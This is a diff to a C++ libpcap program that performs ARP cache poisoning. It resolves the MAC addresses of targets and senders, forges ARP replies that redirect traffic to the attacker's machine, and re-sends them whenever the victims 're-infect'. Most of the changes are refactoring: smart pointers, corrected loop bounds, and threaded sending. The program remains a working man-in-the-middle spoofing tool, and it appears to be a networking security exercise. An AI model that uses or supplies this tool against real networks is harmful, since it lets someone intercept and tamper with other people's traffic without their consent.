@@ -4,20 +4,24 @@
 //          https://www.boost.org/LICENSE_1_0.txt)
 
 #include <pcap.h>
-#include <stdio.h>	//printf(), BUFSIZ
-#include <arpa/inet.h>	//inet_ntop()
-#include <cstring>	//memcmp(), strncpy()
-#include <net/ethernet.h>	//struct ether_header, ETHERTYPE
-#include <netinet/ip.h>		//struct ip, IPPROTO
-#include <netinet/tcp.h>	//struct tcphdr
-#include <sys/ioctl.h>	//ioctl()
-#include <net/if.h>	//struct ifreq
+#include <stdio.h>			//printf(), BUFSIZ
+#include <arpa/inet.h>			//inet_ntop()
+#include <cstring>			//memcmp(), strncpy()
+#include <net/ethernet.h>		//struct ether_header, ETHERTYPE
+#include <netinet/ip.h>			//struct ip, IPPROTO
+#include <netinet/tcp.h>		//struct tcphdr
+#include <sys/ioctl.h>			//ioctl()
+#include <net/if.h>			//struct ifreq
 #include <boost/thread/thread.hpp>	//boost::thread
 #include <boost/chrono/chrono.hpp>	//boost::chrono
 #include <boost/noncopyable.hpp>	//boost::noncopyable
+#include <boost/move/unique_ptr.hpp>	//boost::unique_ptr
+#include <boost/move/make_unique.hpp>	//boost::make_unique
 #include "header.h"
 
 using namespace boost::chrono;
+using boost::movelib::unique_ptr;
+using boost::movelib::make_unique;
 using boost::chrono::steady_clock;
 using boost::thread;
 
@@ -62,7 +66,7 @@ class Ethhdr : protected Header {
 				broadcast();
 			else
 				memcpy(this->ether->ether_dhost, tmac,
-				sizeof(this->ether->ether_dhost));
+					sizeof(this->ether->ether_dhost));
 			memcpy(this->ether->ether_shost, smac,
 				sizeof(this->ether->ether_shost));
 			this->ether->ether_type = htons(ETHERTYPE_ARP);
@@ -262,6 +266,7 @@ struct in_addr* gwip, uint8_t** const buf) {
 			return -1;
 		}
 		fgets(src, sizeof(src)/sizeof(src[0]), fp);
+		fclose(fp);
 		for(int i = sizeof(src)/sizeof(src[0]) + 1; --i;)
 			if(src[i] == 0x0A) { src[i] = 0x00; break; }
 		inet_pton(AF_INET, src, &tmp.s_addr);
@@ -296,11 +301,11 @@ uint8_t **mac, int *chk) {
 	int res = 1;
 	uint8_t *tmp = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
 	const u_char *packet;
-	Arphdr *sent_arp[chk[1]];
+	unique_ptr<Arphdr> sent_arp[chk[1]];
 
-	for(int i = 0; i <= chk[1]; i++) {
-		sent_arp[i] = new Arphdr(&sent_packet[i]);
-	}
+	for(int i = 0; i < chk[1]; i++)
+		sent_arp[i] = make_unique<Arphdr>(&sent_packet[i]);
+
 /************************************************/
 _ret:
 /************************************************/
@@ -310,59 +315,49 @@ _ret:
 		while((res = pcap_next_ex(*handle, &header, &packet)) >= 0) {
 			if(res == 0) continue;
 
-			Ethhdr *ether = new Ethhdr((const u_char **)&packet);
+			auto ether(make_unique<Ethhdr>(&packet));
 			if(ether->getEthertype() == ETHERTYPE_ARP) {
-				Arphdr *arp = new Arphdr((const u_char **)&packet);
+				auto arp(make_unique<Arphdr>(&packet));
 				uint32_t tip = arp->getTip();
 				uint32_t sip = arp->getSip();
 				uint32_t sent_tip[chk[1]];
 				uint32_t sent_sip[chk[1]];
-				for(int i = 0; i <= chk[1]; i++) {
+				for(int i = 0; i < chk[1]; i++) {
 					sent_tip[i] = sent_arp[i]->getTip();
 					sent_sip[i] = sent_arp[i]->getSip();
 				}
 
-				for(int i = 0; i <= chk[1]; i++) {
+				for(int i = 0; i < chk[1]; i++) {
 					if((sent_arp[i]->getOpcode() == 2 && arp->getOpcode() == 1) &&
-						(memcmp(&tip, &sent_sip[i], sizeof(uint32_t)) == 0 &&
-						memcmp(&sip, &sent_tip[i], sizeof(uint32_t)) == 0)) {
+						(memcmp(&tip, &sent_sip[i], sizeof(tip)) == 0 &&
+						memcmp(&sip, &sent_tip[i], sizeof(sip)) == 0)) {
+						//puts("ReInfacted");
 			//printf("sip : %08x, tip : %08x, sent_tip[i] : %08x, sent_sip[i] = %08x\n",
 			//sip, tip, sent_tip[i], sent_sip[i]);
-						//puts("ReInfacted");
 						//dump(&sent_packet[i], &chk[2]);
 						send_packet(handle, &sent_packet[i], &chk[2]);
 						goto _ret; //_ret is at upper region
 					}
-				}
-				for(int i = 0; i <= chk[1]; i++) {
 					#pragma parallel atomic
-					if((sent_arp[i]->getOpcode() == 1 && arp->getOpcode() == 2) &&
-						memcmp(&sent_tip[i], &sip, sizeof(uint32_t)) == 0) {
+					else if((sent_arp[i]->getOpcode() == 1 && arp->getOpcode() == 2) &&
+						memcmp(&sent_tip[i], &sip, sizeof(sent_tip[0])) == 0) {
 						memcpy(mac[i], arp->getSha(), sizeof(mac[0]));
 						//puts("Success");
-			//for(int i = 0; i <= chk[1]; i++)
+			//for(int i = 0; i < chk[1]; i++)
 			//printf("\n\nSender MAC Addr : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
 			//**(mac + i), *(*(mac + i) + 1), *(*(mac + i) + 2),
 			//*(*(mac + i) + 3), *(*(mac + i) + 4), *(*(mac + i) + 5)); //for debugging
-						chk[0]++;
-						if(chk[0] > chk[1]) {
-							delete(ether);	delete(arp);
-							for(int i = 0; i <= chk[1]; i++)
-								delete(sent_arp[i]);
-							return;
-						} else { continue; }
+						if(++chk[0]  == chk[1])	return;
 					}
 				}
-				delete(arp);
 			}
-			delete(ether);
 			duration<double> used_time = steady_clock::now() - start;
 			printf("%lf\n", used_time.count());
 			//if -> lost ARP Request resend
 			//elif -> time-out ARP Reply resend
 			if(sent_arp[0]->getOpcode() == 1 &&
 				used_time.count() >= 10.0) {
-				for(int i = 0; i <= chk[1]; i++)
+				for(int i = 0; i < chk[1]; i++)
 					if(memcmp(mac[i], tmp, sizeof(mac[i])) == 0) {
 						send_packet(handle, &sent_packet[i], &chk[2]);
 						goto _ret; //_ret is at get_tinfo()
@@ -371,7 +366,7 @@ _ret:
 				used_time.count() >= 60.0) {
 				#pragma omp parallel for
 				{
-					for(int i = 0; i <= chk[1]; i++) {
+					for(int i = 0; i < chk[1]; i++) {
 						send_packet(handle, &sent_packet[i], &chk[2]);
 						goto _ret; //_ret is at get_tinfo()
 					}
@@ -394,7 +389,7 @@ int setPcap(pcap_t **handle, const char* const dev) {
 
 int main(int argc, char* argv[]) {
 	int size = sizeof(struct ether_header) + sizeof(struct arphdr);
-	int max = (argc - 4) / 2;
+	int max = (argc - 4) / 2 + 1;
 	int check[3] = {0, max, size};
 
 	uint8_t *mymac = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
@@ -403,21 +398,25 @@ int main(int argc, char* argv[]) {
 	struct in_addr myip, gwip, sip[max], tip[max];
 	pcap_t* handle = nullptr;
 	const u_char *packet[max];
-	Ethhdr *ether[max];
-	Arphdr *arp[max];
+	unique_ptr<Ethhdr> ether[max];
+	unique_ptr<Arphdr> arp[max];
 
-	for(int i = 0; i <= max; i++) {
+
+	for(int i = 0; i < max; i++) {
 		smac[i] = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
 		tmac[i] = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
 		packet[i] = (const u_char *)calloc(size, sizeof(const u_char));
-		ether[i] = new Ethhdr(&packet[i]);
-		arp[i] = new Arphdr(&packet[i]);
+		ether[i] = make_unique<Ethhdr>(&packet[i]);
+		arp[i] = make_unique<Arphdr>(&packet[i]);
 	}
 
-	if(argc > 2 && !(argc % 2)) {
+	if(argc < 3 || argc % 2) {
+		usage();
+		goto _end;
+	} else { 
 		if(setPcap(&handle, argv[1]) == -1)
 			goto _end;
-		#define NUM (i - 2) / 2
+		#define	NUM (i - 2) / 2
 		for(int i = argc - 1; i > 1; i--)
 			if(i % 2) {
 				inet_pton(AF_INET, argv[i], &tip[NUM]);
@@ -428,19 +427,21 @@ int main(int argc, char* argv[]) {
 				sip[NUM].s_addr = htonl(sip[NUM].s_addr);
 				//printf("argv[%d] = Sender %d IP : %08x\n", i, NUM, sip[NUM].s_addr);
 			}
-	} else { usage(); goto _end; }
+		#undef	NUM
+	}
 
 	if(getinfo(argv[1], &myip, &gwip, &mymac) == -1) {
 		pcap_close(handle);
 		goto _end;
 	}
+
 	//printf("My IP : %08x\n", myip.s_addr);
 	//printf("Gw IP : %08x\n", gwip.s_addr);
 	//printf("My MAC Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
 	//	*mymac, *(mymac + 1), *(mymac + 2), *(mymac + 3),
 	//	*(mymac + 4), *(mymac + 5)); //for debugging
 
-	for(int i = 0; i <= max; i++) {	//Target Req
+	for(int i = 0; i < max; i++) {	//Target Req
 		ether[i]->ether_build(mymac);
 		arp[i]->arp_build(&myip, mymac, &tip[i]);
 		//ether[i]->print();
@@ -448,13 +449,18 @@ int main(int argc, char* argv[]) {
 		//putchar('\n');
 	}
 
-	for(int i = 0; i <= max; i++)
-		send_packet(&handle, &packet[i], &size);
+	{
+		thread t([&max, &handle, &packet, &size] {
+			for(int i = 0; i < max; i++)
+				send_packet(&handle, &packet[i], &size);
+		});
 
-	get_tinfo(&handle, (const u_char **)packet, (uint8_t **)tmac, check);
-	check[0] = 0;
+		get_tinfo(&handle, (const u_char **)packet, (uint8_t **)tmac, check);
+		check[0] = 0;
+		//if(t.joinable())	t.join();
+	}
 
-	for(int i = 0; i <= max; i++) {	//Sender Req
+	for(int i = 0; i < max; i++) {	//Sender Req
 		ether[i]->ether_build(mymac);
 		arp[i]->arp_build(&myip, mymac, &sip[i]);
 		//ether[i]->print();
@@ -462,13 +468,18 @@ int main(int argc, char* argv[]) {
 		//putchar('\n');
 	}
 
-	for(int i = 0; i <= max; i++)
-		send_packet(&handle, &packet[i], &size);
+	{
+		thread t([&max, &handle, &packet, &size] {
+			for(int i = 0; i < max; i++)
+				send_packet(&handle, &packet[i], &size);
+		});
 
-	get_tinfo(&handle, (const u_char **)packet, (uint8_t **)smac, check);
-	check[0] = 0;
+		get_tinfo(&handle, (const u_char **)packet, (uint8_t **)smac, check);
+		check[0] = 0;
+		//if(t.joinable())	t.join();
+	}
 
-	for(int i = 0; i <= max; i++) {
+	for(int i = 0; i < max; i++) {
 		ether[i]->ether_build(mymac, smac[i]);
 		arp[i]->arp_build(&tip[i], mymac, &sip[i], smac[i]);
 		//ether[i]->print();
@@ -477,8 +488,8 @@ int main(int argc, char* argv[]) {
 	}
 	
 	{
-		thread t([&] {
-			for(int i = 0; i <= max; i++) {
+		thread t([&max, &handle, &packet, &size] {
+			for(int i = 0; i < max; i++) {
 				send_packet(&handle, &packet[i], &size);
 				//printf("Send packet[%d]\n", i);
 			}
@@ -488,6 +499,7 @@ int main(int argc, char* argv[]) {
 			get_tinfo(&handle, (const u_char **)packet,
 				(uint8_t **)tmac, check);
 		//}
+		//if(t.joinable())	t.join();
 	}
 
 	pcap_close(handle);
@@ -495,14 +507,13 @@ int main(int argc, char* argv[]) {
 /************************************************/
 _end:
 /************************************************/
-	for(int i = 0; i <= max; i++) {
+	for(int i = 0; i < max; i++) {
 		free(tmac[i]);			free(smac[i]);
-		free(ether[i]);			free(arp[i]);
 		free((void *)packet[i]);	packet[i] = nullptr;
 		tmac[i] = nullptr;		smac[i] = nullptr;
-		ether[i] = nullptr;		arp[i] = nullptr;
 	}
 		free(mymac);			mymac = nullptr;
+		free(gwmac);			gwmac = nullptr;
 
 	return 0;
 }
